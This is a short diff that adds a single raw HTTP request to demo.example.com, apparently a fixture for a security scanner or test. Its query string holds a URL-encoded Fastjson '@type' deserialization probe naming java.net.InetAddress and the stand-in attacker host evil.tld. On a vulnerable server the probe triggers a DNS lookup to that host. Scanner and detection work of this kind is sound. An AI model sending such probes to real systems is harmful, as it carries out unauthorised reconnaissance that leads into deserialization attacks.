@@ -1,0 +1,4 @@
+GET /a?s=%7B%22%40type%22%3A%22java.net.InetAddress%22%2C%22val%22%3A%22evil.tld%22%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
